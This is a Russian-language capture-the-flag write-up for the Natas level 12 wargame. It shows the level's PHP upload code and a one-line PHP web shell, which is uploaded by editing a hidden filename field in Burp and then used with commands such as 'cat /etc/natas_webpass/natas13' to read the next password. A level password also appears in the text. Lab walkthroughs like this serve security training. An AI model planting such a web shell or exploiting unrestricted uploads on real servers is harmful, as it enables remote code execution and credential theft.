Natas12

login:natas12
password:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

1) При посещении главной страницы есть возможность загрузить картинку (не более 1кб). Так же есть возможность посмотреть исходный код(View sourcecode)
![изображение](https://user-images.githubusercontent.com/54982244/173202831-8edbf58a-d2f6-4e00-83cf-2b5496f87d71.png)
2) В исходном коде можно увидить такой код:


        <? 
        function genRandomString() {
            $length = 10;
            $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
            $string = "";    

            for ($p = 0; $p < $length; $p++) {
                $string .= $characters[mt_rand(0, strlen($characters)-1)];
            }

            return $string;
        }

        function makeRandomPath($dir, $ext) {
            do {
            $path = $dir."/".genRandomString().".".$ext;
            } while(file_exists($path));
            return $path;
        }

        function makeRandomPathFromFilename($dir, $fn) {
            $ext = pathinfo($fn, PATHINFO_EXTENSION);
            return makeRandomPath($dir, $ext);
        }

        if(array_key_exists("filename", $_POST)) {
            $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


                if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
                echo "File is too big";
            } else {
                if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
                    echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
                } else{
                    echo "There was an error uploading the file, please try again!";
                }
            }
        } else {
        ?> 
    
    
3) Попробуем разобратся. Данные передаются с помощью post запроса. Следующем шагом идет вызов функции makeRandomPathFromFilename. В ней нашему загружаему
файлу присваевается расширения на основе, имени файла. Только вот имя НАШЕГО загружаемого файла никак не влияет на это, так как расширение извлекается из
скрытого параметра 

        <input type="hidden" name="filename" value="v28ho0ti1k.jpg" /> 
        
и так как в value указано расширение jpg, любым файлам которые мы загружаем 
будет присвоено расширение .jpg
![изображение](https://user-images.githubusercontent.com/54982244/173203061-5d3b9f7c-8377-4ae3-b176-7cce0f4a55da.png)

          function makeRandomPathFromFilename($dir, $fn) {
              $ext = pathinfo($fn, PATHINFO_EXTENSION);
              return makeRandomPath($dir, $ext);
          }
 
3)Фактический это означает что никакой проверки расширения нет, можно загрузить файл с любым расширением, но перед этим поменять значение value в скрытом
параметре. Напишем такой php код

    <?php
    system($_GET['cmd']);
    ?>
    
Простое выполнение системной команды переданной в GET параметр cmd.

4)Перехватываем запрос через burp, меняем расширение в скрытом параметре с .jpg на .php
![изображение](https://user-images.githubusercontent.com/54982244/173203390-a12fee46-ff8e-4264-9507-c1f06b6a19f3.png)
5)Отправляем запрос дальше, и получаем ссылку на наш php файл.
![изображение](https://user-images.githubusercontent.com/54982244/173203412-fa1ae266-20cd-47cb-ac26-6282ee510284.png)
6)Переходим к нашему php файлу, передаем GET параметр ?cmd=id (Системная команда). Таким образом с помощью загрузки файла удалось достичь 
удаленого выполнения кода. 
![изображение](https://user-images.githubusercontent.com/54982244/173203437-1c64bce7-eac9-438a-8e8e-28b20b26e413.png)
7) Осталось прочитать пароль для следующего уровня. ?cmd=cat%20/etc/natas_webpass/natas13
![изображение](https://user-images.githubusercontent.com/54982244/173203506-7d7c5c51-dc09-4e45-8143-fad3b0f0a51d.png)



 
